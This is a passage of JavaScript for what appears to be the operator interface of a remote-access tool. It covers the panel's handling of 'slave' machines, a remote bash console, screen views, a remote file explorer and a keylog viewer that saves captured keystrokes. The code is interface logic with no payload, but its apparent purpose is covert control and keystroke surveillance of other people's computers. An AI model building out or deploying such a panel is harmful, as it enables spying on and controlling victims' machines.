          row.classList.toggle('selected', keylogSelected.has(idx));
          cb.checked = keylogSelected.has(idx);
          if (btnKeylogSave) btnKeylogSave.disabled = keylogSelected.size === 0;
        };
        on(row, 'click', (ev) => { if (ev.target !== cb) toggle(); });
        on(cb, 'change', toggle);
        keylogList.appendChild(row);
      });
    });
  }

  on(btnKeylogApply, 'click', () => {
    callPython('onKeyLogTimeRangeSet', (keylogFrom && keylogFrom.value) || null, (keylogTo && keylogTo.value) || null);
  });
  on(btnKeylogSave, 'click', () => {
    const keys = [...keylogSelected].sort((a, b) => a - b).map((i) => keylogEntries[i]);
    callPython('onKeyLogSave', keys);
  });


  // hotkeys
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      if (drawer && drawer.classList.contains('open')) { closeDrawer(); e.preventDefault(); return; }
      if (explorerOpenPath) { closeExplorerViewer(); e.preventDefault(); return; }
      return;
    }
    if ((e.ctrlKey || e.metaKey) && (e.key === 'l' || e.key === 'L')) {
      if (app && !app.hidden) {
        e.preventDefault();
        switchPage('bash');
        setTimeout(() => bashInput && bashInput.focus(), 30);
      }
      return;
    }
    if (isTypingTarget(e.target)) return;
    if (app && app.hidden) return;
    if (e.ctrlKey || e.metaKey || e.altKey) return;
    const k = e.key;
    if (k >= '1' && k <= '5') {
      const page = PAGE_ORDER[Number(k) - 1];
      if (page) { switchPage(page); e.preventDefault(); }
      return;
    }
    if (k === 's' || k === 'S') { toggleDrawer(); e.preventDefault(); return; }
    if (k === 'r' || k === 'R') { doReconnect(); e.preventDefault(); return; }
  });

  // konami
  const konami = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
  let kIdx = 0;
  document.addEventListener('keydown', (e) => {
    if (e.keyCode === konami[kIdx]) {
      kIdx++;
      if (kIdx === konami.length) {
        kIdx = 0;
        document.body.classList.toggle('gachi-mode');
        sendAnnounce(document.body.classList.contains('gachi-mode') ? '♂ Dungeon rank: GYMPROOF' : 'Returned to civilian form', 'success');
      }
    } else {
      kIdx = e.keyCode === konami[0] ? 1 : 0;
    }
  });

  const logoMark = $('#logo-mark') || $('.logo-mark');
  let logoClicks = 0, logoTimer = null;
  if (logoMark) {
    logoMark.style.cursor = 'pointer';
    on(logoMark, 'click', () => {
      logoClicks++;
      clearTimeout(logoTimer);
      logoTimer = setTimeout(() => { logoClicks = 0; }, 2000);
      if (logoClicks >= 7) {
        logoClicks = 0;
        sendAnnounce(GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)], 'success');
      }
    });
  }


  /**
   * playSound(base64 [, mime])
   * Plays audio from raw base64 or full data URI.
   * @param {string} base64
   * @param {string} [mime='audio/mpeg']
   */
  let _soundAudio = null;
  function playSound(base64, mime, volume) {
    if (!base64 || typeof base64 !== 'string') return;
    let src = base64;
    if (!src.startsWith('data:') && !src.startsWith('blob:') && !src.startsWith('http')) {
      src = 'data:' + (mime || 'audio/mpeg') + ';base64,' + src.replace(/\s+/g, '');
    }
    try {
      if (_soundAudio) {
        try { _soundAudio.pause(); } catch (_) {}
        _soundAudio = null;
      }
      _soundAudio = new Audio(src);
      _soundAudio.volume = volume;
      _soundAudio.play().catch((err) => {
        console.warn('[playSound]', err);
        sendAnnounce('Sound play failed', 'warn');
      });
    } catch (e) {
      console.warn('[playSound]', e);
    }
  }
  function stopSound() {
    if (_soundAudio) {
      try { _soundAudio.pause(); _soundAudio.currentTime = 0; } catch (_) {}
      _soundAudio = null;
    }
  }

  window.setAuthenticated = setAuthenticated;
  window.setMaximized = setMaximized;
  window.sendAnnounce = sendAnnounce;
  window.setSlavesTree = setSlavesTree;
  window.setInfo = setInfo;
  window.setScreen = setScreen;
  window.appendBash = appendBash;
  window.clearBash = clearBash;
  window.setLoginError = setLoginError;
  window.setSlaveState = setSlaveState;
  window.setLocal = setLocal;
  window.setExplorerPath = setExplorerPath;
  window.setExplorerFile = setExplorerFile;
  window.setKeyLog = setKeyLog;
  window.playSound = playSound;
  window.stopSound = stopSound;

  window.DM = {
    setAuthenticated, setMaximized, sendAnnounce, setSlavesTree, setInfo, setScreen,
    appendBash, clearBash, setLoginError, openSlave, closeSlave, switchPage,
    setSlaveState, setLocal, setExplorerPath, setExplorerFile, setKeyLog, playSound, stopSound
  };

  updateNoSlaveHint();
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initCodeMirror);
  else initCodeMirror();
})();